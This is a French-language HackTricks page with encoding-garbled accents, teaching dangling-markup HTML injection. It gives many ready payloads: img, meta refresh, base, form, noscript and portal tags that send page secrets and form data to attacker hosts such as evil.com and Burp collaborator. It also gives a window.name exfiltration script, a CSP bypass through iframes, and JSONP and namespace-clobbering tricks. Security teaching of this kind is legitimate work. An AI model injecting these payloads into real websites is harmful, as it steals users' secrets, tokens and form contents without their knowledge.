# Dangling Markup - Injection HTML sans script

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## R√©sum√©

Cette technique peut √™tre utilis√©e pour extraire des informations d'un utilisateur lorsqu'une **injection HTML est trouv√©e**. C'est tr√®s utile si vous **ne trouvez aucun moyen d'exploiter un** [**XSS**](../xss-cross-site-scripting/) mais que vous pouvez **injecter certaines balises HTML**.\
Elle est √©galement utile si un **secret est sauvegard√© en clair** dans le HTML et que vous souhaitez **l'exfiltrer** du client, ou si vous voulez induire en erreur l'ex√©cution d'un script.

Plusieurs techniques comment√©es ici peuvent √™tre utilis√©es pour contourner certaines [**Politiques de S√©curit√© de Contenu**](../content-security-policy-csp-bypass/) en exfiltrant des informations de mani√®res inattendues (balises html, CSS, balises http-meta, formulaires, base...).

## Principales Applications

### Voler des secrets en clair

Si vous injectez `<img src='http://evil.com/log.cgi?` lorsque la page est charg√©e, la victime vous enverra tout le code entre la balise `img` inject√©e et la prochaine guillemet dans le code. Si un secret se trouve de mani√®re quelconque dans ce bloc, vous le volerez (vous pouvez faire la m√™me chose en utilisant un guillemet double, regardez lequel pourrait √™tre plus int√©ressant √† utiliser).

Si la balise `img` est interdite (√† cause de CSP par exemple), vous pouvez √©galement utiliser `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Notez que **Chrome bloque les URL HTTP** contenant "<" ou "\n", donc vous pourriez essayer d'autres sch√©mas de protocole comme "ftp".

Vous pouvez √©galement abuser de CSS `@import` (envoie tout le code jusqu'√† ce qu'il trouve un ";")
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Vous pourriez √©galement utiliser **`<table`**:
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Vous pouvez √©galement ins√©rer une balise `<base>`. Toutes les informations seront envoy√©es jusqu'√† ce que la citation soit ferm√©e, mais cela n√©cessite une interaction de l'utilisateur (l'utilisateur doit cliquer sur un lien, car la balise base aura chang√© le domaine point√© par le lien) :
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### Vol de formulaires
```markup
<base href='http://evil.com/'>
```
### Vol de formulaires 2

D√©finissez un en-t√™te de formulaire : `<form action='http://evil.com/log_steal'>` cela √©crasera l'en-t√™te du formulaire suivant et toutes les donn√©es du formulaire seront envoy√©es √† l'attaquant.

### Vol de formulaires 3

Le bouton peut changer l'URL o√π les informations du formulaire vont √™tre envoy√©es avec l'attribut "formaction" :
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un attaquant peut utiliser cela pour voler des informations.

### Vol de secrets en clair 2

En utilisant la technique mentionn√©e pr√©c√©demment pour voler des formulaires (en injectant un nouvel en-t√™te de formulaire), vous pouvez ensuite injecter un nouveau champ de saisie :
```markup
<input type='hidden' name='review_body' value="
```
et ce champ de saisie contiendra tout le contenu entre sa double citation et la prochaine double citation dans le HTML. Cette attaque combine "_**Vol de secrets en clair**_" avec "_**Vol de formulaires2**_".

Vous pouvez faire la m√™me chose en injectant un formulaire et une balise `<option>`. Toutes les donn√©es jusqu'√† ce qu'une balise `</option>` ferm√©e soit trouv√©e seront envoy√©es :
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Injection de param√®tre de formulaire

Vous pouvez modifier le chemin d'un formulaire et ins√©rer de nouvelles valeurs afin qu'une action inattendue soit effectu√©e :
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Vol de secrets en clair via noscript

`<noscript></noscript>` est une balise dont le contenu sera interpr√©t√© si le navigateur ne prend pas en charge javascript (vous pouvez activer/d√©sactiver Javascript dans Chrome √† [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Une mani√®re d'exfiltrer le contenu de la page web du point d'injection jusqu'en bas vers un site contr√¥l√© par l'attaquant consistera √† injecter ceci :
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Contournement de CSP avec interaction utilisateur

D'apr√®s cette [recherche de portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), vous pouvez apprendre que m√™me dans les environnements **les plus restreints par CSP**, vous pouvez toujours **exfiltrer des donn√©es** avec une certaine **interaction de l'utilisateur**. Pour cette occasion, nous allons utiliser le payload :
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Notez que vous demanderez √† la **victime** de **cliquer sur un lien** qui la **redirigera** vers un **payload** que vous contr√¥lez. Notez √©galement que l'attribut **`target`** √† l'int√©rieur de la balise **`base`** contiendra du **contenu HTML** jusqu'√† la prochaine apostrophe simple.\
Cela signifie que la **valeur** de **`window.name`** si le lien est cliqu√© sera tout ce **contenu HTML**. Par cons√©quent, comme vous **contr√¥lez la page** o√π la victime acc√®de en cliquant sur le lien, vous pouvez acc√©der √† ce **`window.name`** et **exfiltrer** ces donn√©es :
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flux de travail de script trompeur 1 - Attaque de l'espace de noms HTML

Ins√©rez une nouvelle balise avec un id √† l'int√©rieur du HTML qui √©crasera la suivante et avec une valeur qui affectera le flux d'un script. Dans cet exemple, vous s√©lectionnez avec qui une information va √™tre partag√©e :
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Flux de travail de script trompeur 2 - Attaque de l'espace de noms de script

Cr√©ez des variables √† l'int√©rieur de l'espace de noms javascript en ins√©rant des balises HTML. Ensuite, cette variable affectera le flux de l'application :
```markup
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Abus de JSONP

Si vous trouvez une interface JSONP, vous pourriez √™tre capable d'appeler une fonction arbitraire avec des donn√©es arbitraires :
```markup
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Ou vous pouvez m√™me essayer d'ex√©cuter du javascript :
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Abus de l'iframe

Notez qu'un **document enfant peut voir et d√©finir la propri√©t√© de localisation pour le parent, m√™me en cross-origin.** Cela signifie que vous pouvez faire acc√©der le client √† n'importe quelle autre page en chargeant dans un **iframe** du code comme :
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Cela peut √™tre att√©nu√© avec quelque chose comme : _**sandbox='allow-scripts allow-top-navigation'**_

Un iframe peut √©galement √™tre utilis√© pour divulguer des informations sensibles d'une autre page **en utilisant l'attribut name de l'iframe**. C'est parce que vous pouvez cr√©er un iframe qui s'auto-iframe en abusant de l'injection HTML qui fait **appara√Ætre les infos sensibles √† l'int√©rieur de l'attribut name de l'iframe** puis acc√©der √† ce nom depuis l'iframe initial et le divulguer.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Pour plus d'informations, consultez [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### Abus de la balise \<meta

Vous pouvez utiliser **`meta http-equiv`** pour effectuer **plusieurs actions** comme d√©finir un Cookie : `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou effectuer une redirection (dans ce cas, apr√®s 5 secondes) : `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Cela peut √™tre **√©vit√©** avec une **CSP** concernant **http-equiv** (`Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Nouvelle balise HTML \<portal

Vous pouvez trouver une recherche tr√®s **int√©ressante** sur les vuln√©rabilit√©s exploitables de la balise \<portal [ici](https://research.securitum.com/security-analysis-of-portal-element/).\
Au moment de la r√©daction de ce texte, vous devez activer la balise portal sur Chrome dans `chrome://flags/#enable-portals` sinon cela ne fonctionnera pas.
```markup
<portal src='https://attacker-server?
```
### Fuites HTML

Toutes les m√©thodes de fuite de connectivit√© en HTML ne seront pas utiles pour le Dangling Markup, mais parfois elles pourraient aider. V√©rifiez-les ici : [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

C'est un **m√©lange** entre **dangling markup et XS-Leaks**. D'un c√¥t√©, la vuln√©rabilit√© permet d'**injecter du HTML** (mais pas de JS) dans une page de la **m√™me origine** que celle que nous attaquerons. D'un autre c√¥t√©, nous n'allons pas **attaquer** directement la page o√π nous pouvons injecter du HTML, mais **une autre page**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

Les XS-Search sont orient√©s vers l'**exfiltration d'informations cross-origin** en abusant des **attaques par canal auxiliaire**. Par cons√©quent, c'est une technique diff√©rente du Dangling Markup, cependant, certaines des techniques abusent de l'inclusion de balises HTML (avec et sans ex√©cution de JS), comme [**Injection CSS**](../xs-search.md#css-injection) ou [**Chargement paresseux d'images**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Liste de d√©tection par force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## R√©f√©rences

Toutes les techniques pr√©sent√©es ici et plus peuvent √™tre examin√©es plus en d√©tail dans :

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

D'autres balises HTML qui peuvent √™tre abus√©es peuvent √™tre trouv√©es ici :

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

Plus d'infos :

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
